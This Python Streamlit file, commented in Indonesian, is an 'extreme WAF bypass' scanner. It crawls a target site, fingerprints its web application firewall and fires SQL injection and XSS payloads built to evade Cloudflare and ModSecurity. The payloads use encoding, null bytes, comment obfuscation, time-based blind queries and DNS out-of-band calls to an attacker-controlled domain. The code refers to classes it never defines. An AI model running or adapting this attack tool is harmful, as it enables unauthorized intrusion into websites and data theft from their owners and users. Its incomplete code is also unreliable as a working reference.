import streamlit as st
import requests
import re
import random
import time
import hashlib
import json
import threading
import dns.resolver
from collections import deque, defaultdict
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, quote, unquote
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from typing import List, Dict, Set, Tuple, Optional
import warnings
warnings.filterwarnings('ignore')

# ================= KONFIGURASI EXTREME WAF BYPASS =================
MAX_THREADS = 30                     # Lebih agresif
CRAWL_LIMIT = 300
REQUEST_TIMEOUT = 5                  # Lebih lama untuk time-based
MAX_RETRIES = 3
RATE_LIMIT_DELAY = 0.05

# DNS OOB Server (ganti dengan server collab Anda)
DNS_OOB_DOMAIN = "your-oob-server.com"

# ================= ADVANCED WAF BYPASS PAYLOAD DATABASE =================
# Multi-layer encoding & fragmentasi
SQLI_PAYLOADS_BYPASS = [
    # Double URL encoding
    "'%2520OR%2520'1'%2520%253D%2520'1",
    "'%2520UNION%2520SELECT%2520@@version--",
    # Hex encoding
    "0x27204f5220313d3127",   # "' OR 1=1"
    # Unicode / UTF-16
    "%u0027%u0020%u004F%u0052%u0020%u0031%u003D%u0031",
    # Null byte injection (memotong parsing WAF)
    "%00' OR 1=1--",
    # Komentar bersarang
    "'/*!50000OR*/ 1=1--",
    "' OR 1=1/*!00000*/--",
    # HTTP Parameter Pollution (HPP)
    "id=1&id=' OR 1=1--",
    # Time-based dengan delay tidak mencolok
    "' OR SLEEP(2) AND '1'='1",
    "' WAITFOR DELAY '00:00:02'--",
    "' OR IF(1=1, BENCHMARK(5000000,MD5('x')), 0)--",
    # DNS OOB
    f"' OR LOAD_FILE('\\\\\\\\{DNS_OOB_DOMAIN}\\\\test')--",
    f"'; EXEC xp_dirtree '\\\\\\\\{DNS_OOB_DOMAIN}\\\\test'--",
]

# XSS dengan WAF bypass
XSS_BYPASS = [
    "<ScRiPt>alert(1)</ScRiPt>",
    "<img src=x onerror=\"alert(1)\" />",
    "<svg/onload=alert(1)>",
    "javascrip%74:alert(1)",
    "<a href=\"javas	cript:alert(1)\">click</a>",  # tab injection
]

# ================= WAF FINGERPRINTING =================
class AdvancedWAFDetector:
    def __init__(self):
        self.waf_rules = {
            "Cloudflare": ["cf-ray", "__cfduid", "blocked by cloudflare"],
            "AWS WAF": ["x-amzn-RequestId", "403 Forbidden"],
            "ModSecurity": ["Mod_Security", "406 Not Acceptable"],
            "Sucuri": ["sucuri", "x-sucuri-id"],
            "Imperva": ["x-iinfo", "incap_ses"],
            "F5 BIG-IP": ["X-WA-Info", "The requested URL was rejected"],
        }
        self.active_probe_results = {}  # menyimpan payload apa yang diblokir

    def probe_waf(self, url: str, param: str) -> Dict:
        """Mengirim probe untuk mengetahui aturan blokir WAF"""
        probe_payloads = [
            ("union select", "union%20select"),
            ("or 1=1", "or%201=1"),
            ("sleep(5)", "sleep%285%29"),
            ("'", "%27"),
            ("\"", "%22"),
        ]
        results = {}
        for name, payload in probe_payloads:
            test_url = f"{url}?{param}={payload}"
            try:
                resp = requests.get(test_url, timeout=5)
                results[name] = resp.status_code
            except:
                results[name] = 500
        return results

    def detect(self, response: requests.Response) -> Tuple[bool, List[str], Dict]:
        headers_lower = {k.lower(): v.lower() for k, v in response.headers.items()}
        detected_wafs = []
        for waf, sigs in self.waf_rules.items():
            for sig in sigs:
                if sig in str(headers_lower) or sig in response.text.lower():
                    detected_wafs.append(waf)
                    break
        return len(detected_wafs) > 0, detected_wafs, self.active_probe_results

# ================= ADAPTIVE PAYLOAD GENERATOR (WAF BYPASS) =================
class AdaptivePayloadGenerator:
    def __init__(self, waf_type: List[str]):
        self.waf_type = waf_type
        self.bypass_techniques = []

        if "Cloudflare" in waf_type:
            self.bypass_techniques.extend([
                self.double_url_encode,
                self.null_byte_injection,
                self.http_param_pollution,
            ])
        if "ModSecurity" in waf_type:
            self.bypass_techniques.extend([
                self.case_mutation,
                self.sql_comment_obfuscation,
                self.unicode_escape,
            ])
        # Default jika tidak terdeteksi
        if not self.bypass_techniques:
            self.bypass_techniques = [
                self.double_url_encode,
                self.sql_comment_obfuscation,
                self.time_based_blind,
                self.dns_oob,
            ]

    def double_url_encode(self, payload: str) -> str:
        return quote(quote(payload))

    def null_byte_injection(self, payload: str) -> str:
        return f"%00{payload}"

    def http_param_pollution(self, payload: str) -> str:
        # Parameter pollution: misal id=1&id=' OR 1=1--
        return f"dummy=1&original={payload}"

    def case_mutation(self, payload: str) -> str:
        # Ubah huruf besar/kecil secara acak
        return ''.join(c.upper() if random.choice([True, False]) else c.lower() for c in payload)

    def sql_comment_obfuscation(self, payload: str) -> str:
        # Menyisipkan komentar /*! ... */ di tengah kata kunci SQL
        keywords = ['SELECT', 'UNION', 'OR', 'AND', 'FROM', 'WHERE']
        for kw in keywords:
            if kw in payload.upper():
                obf = kw[0] + '/*!50000' + kw[1:] + '*/'
                payload = re.sub(kw, obf, payload, flags=re.IGNORECASE)
        return payload

    def unicode_escape(self, payload: str) -> str:
        # %u0027 untuk single quote
        return payload.replace("'", "%u0027").replace('"', "%u0022")

    def time_based_blind(self, payload: str) -> str:
        # Ubah payload menjadi time-based jika mengandung SLEEP
        if "SLEEP" in payload.upper() or "WAITFOR" in payload.upper():
            return payload
        # Tambahkan delay yang tidak terlalu mencolok
        return payload + " AND IF(1=1, SLEEP(2), 0)--"

    def dns_oob(self, payload: str) -> str:
        # Tambahkan DNS out-of-band
        return payload.replace("@@version", f"LOAD_FILE('\\\\\\\\{DNS_OOB_DOMAIN}\\\\test')")

    def generate(self, base_payloads: List[str]) -> List[str]:
        all_payloads = set(base_payloads)
        for payload in base_payloads:
            for technique in self.bypass_techniques:
                try:
                    mutated = technique(payload)
                    all_payloads.add(mutated)
                except:
                    pass
        return list(all_payloads)

# ================= TIME-BASED & DNS OOB DETECTOR =================
class TimeBasedDetector:
    @staticmethod
    def check_sleep(url: str, param: str, sleep_seconds: int = 3) -> bool:
        """Kirim payload dengan SLEEP, bandingkan waktu respons"""
        payload = f"' OR SLEEP({sleep_seconds})--"
        test_url = f"{url}?{param}={quote(payload)}"
        try:
            start = time.time()
            requests.get(test_url, timeout=sleep_seconds+2)
            elapsed = time.time() - start
            return elapsed >= sleep_seconds
        except:
            return False

class DNSOOBDetector:
    @staticmethod
    def check_dns_oob(url: str, param: str, domain: str) -> bool:
        """Kirim payload yang memicu query DNS ke server milik attacker"""
        # Implementasi sederhana: kita asumsikan ada listener DNS
        # Di sini kita hanya mengirim payload dan nantinya dicocokkan dengan log server
        payload = f"' LOAD_FILE('\\\\\\\\{domain}\\\\test')--"
        test_url = f"{url}?{param}={quote(payload)}"
        try:
            requests.get(test_url, timeout=3)
            # Dalam implementasi nyata, kita perlu mengecek apakah ada DNS query ke domain
            # Untuk demo, kita return False karena butuh server eksternal
            return False
        except:
            return False

# ================= EXTREME SCANNER DENGAN WAF BYPASS =================
class ExtremeWAFBypassScanner:
    def __init__(self, target: str):
        self.target = target
        self.session = requests.Session()
        self.waf_detector = AdvancedWAFDetector()
        self.results = ScanResult(target=target)
        self.baseline = {}

    def scan(self) -> ScanResult:
        start_time = time.time()

        # Phase 1: Crawling
        st.write("🌐 Phase 1: Deep Crawl + JS/API Discovery")
        crawler = IntelligentCrawler(self.target, max_urls=CRAWL_LIMIT)
        crawl_result = crawler.crawl()
        self.results.crawled_urls = crawl_result.crawled_urls

        # Phase 2: WAF Fingerprinting
        st.write("🛡️ Phase 2: WAF Fingerprinting & Adaptive Bypass Preparation")
        # Ambil satu URL untuk probe
        test_url = self.results.crawled_urls[0] if self.results.crawled_urls else self.target
        parsed = urlparse(test_url)
        first_param = list(parse_qs(parsed.query).keys())[0] if parse_qs(parsed.query) else "id"
        waf_probe = self.waf_detector.probe_waf(test_url, first_param)
        # Deteksi WAF dari respons normal
        try:
            resp = self.session.get(test_url, timeout=5)
            has_waf, waf_names, _ = self.waf_detector.detect(resp)
        except:
            has_waf, waf_names = False, []

        st.info(f"Detected WAF: {waf_names if waf_names else 'None'} | Probe results: {waf_probe}")

        # Phase 3: Generate payload khusus bypass WAF
        st.write("⚡ Phase 3: Generating Adaptive Payloads for WAF Bypass")
        adapter = AdaptivePayloadGenerator(waf_names)
        all_payloads = adapter.generate(SQLI_PAYLOADS_BYPASS + XSS_BYPASS)

        # Phase 4: Scan dengan multiple techniques
        st.write("💥 Phase 4: Aggressive WAF Bypass Scanning")
        vulnerabilities = []

        # Gunakan Time-based detection jika WAF memblokir anomali
        use_time_based = has_waf

        with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
            futures = []
            for url in self.results.crawled_urls[:100]:
                parsed_url = urlparse(url)
                params = parse_qs(parsed_url.query)
                for param in params.keys():
                    if use_time_based:
                        # Prioritaskan time-based
                        futures.append(executor.submit(self.test_time_based, url, param))
                    else:
                        for payload in all_payloads[:30]:
                            futures.append(executor.submit(self.test_payload, url, param, payload))

            for future in as_completed(futures):
                vuln = future.result()
                if vuln:
                    vulnerabilities.append(vuln)

        self.results.vulnerabilities = vulnerabilities
        self.results.scan_time = time.time() - start_time
        return self.results

    def test_time_based(self, url: str, param: str) -> Optional[Vulnerability]:
        """Uji dengan time-based blind (tidak terpengaruh respons 403)"""
        if TimeBasedDetector.check_sleep(url, param, sleep_seconds=3):
            return Vulnerability(
                url=url, param=param, payload="' OR SLEEP(3)--",
                vuln_type="SQL Injection (Time-based Blind)",
                severity="HIGH", confidence=0.95,
                evidence="Response delay detected (3+ seconds)",
                response_time=3.0, status_code=200, response_size=0
            )
        return None

    def test_payload(self, url: str, param: str, payload: str) -> Optional[Vulnerability]:
        test_url = f"{url}?{param}={quote(payload)}"
        try:
            resp = self.session.get(test_url, timeout=REQUEST_TIMEOUT)
            # Jika status bukan 403, ada kemungkinan berhasil
            if resp.status_code != 403:
                # Lakukan analisis anomali
                if "error" in resp.text.lower() or "mysql" in resp.text.lower():
                    return Vulnerability(
                        url=url, param=param, payload=payload,
                        vuln_type="SQL Injection", severity="HIGH",
                        confidence=0.8, evidence=resp.text[:100],
                        response_time=resp.elapsed.total_seconds(),
                        status_code=resp.status_code, response_size=len(resp.text)
                    )
        except:
            pass
        return None

# ================= MAIN UI =================
def main():
    st.set_page_config(page_title="🔥 EXTREME WAF BYPASS SCANNER", layout="wide")
    st.title("🔥 EXTREME WAF BYPASS SCANNER v4.0")
    st.markdown("*Didesain untuk menembus Cloudflare, ModSecurity, dan WAF modern*")

    target = st.text_input("Target URL", placeholder="https://example.com/page.php?id=1")
    if st.button("🚀 START WAF BYPASS SCAN"):
        if not target:
            st.error("Masukkan URL target")
            return
        scanner = ExtremeWAFBypassScanner(target)
        results = scanner.scan()
        st.success(f"Scan selesai. Ditemukan {len(results.vulnerabilities)} kerentanan (termasuk yang melewati WAF).")
        for v in results.vulnerabilities:
            st.warning(f"**{v.vuln_type}** di `{v.param}` dengan payload `{v.payload}`")

if __name__ == "__main__":
    main()
